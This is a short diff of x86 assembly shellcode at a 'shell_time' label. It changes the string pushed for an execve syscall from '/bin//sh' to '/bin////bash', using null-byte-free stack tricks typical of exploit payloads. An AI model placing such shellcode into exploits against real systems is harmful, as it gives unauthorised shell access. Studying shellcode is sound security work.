@@ -206,14 +206,15 @@ shell_time:
 
 	xor eax, eax	; clean out eax
 	push eax	; need a null byte for execve parameters
-	push 0x68732f2f	; hs//
+	push 0x68736162	; hsab
+	push 0x2f2f2f2f	; ////
 	push 0x6e69622f	; nib/ 
 	xor ebx, ebx	; clean out ebx, though may be unnecessary
 	mov ebx, esp	; save stack pointer in ebx
 	push eax	; push another null onto stack
-	mov edx, esp	; 0x00/bin//sh0x00
-	push ebx	; points to /bin//sh0x00
-	mov ecx, esp	; points to 0x00/bin//sh0x00
+	mov edx, esp	; 0x00hsab////nib/0x00
+	push ebx	; points to 0x00hsab////nib/
+	mov ecx, esp	; store pointer to 0x00hsab////nib/ into ecx
 	mov al, 0xb	; execve
 	int 0x80	; call it
 	
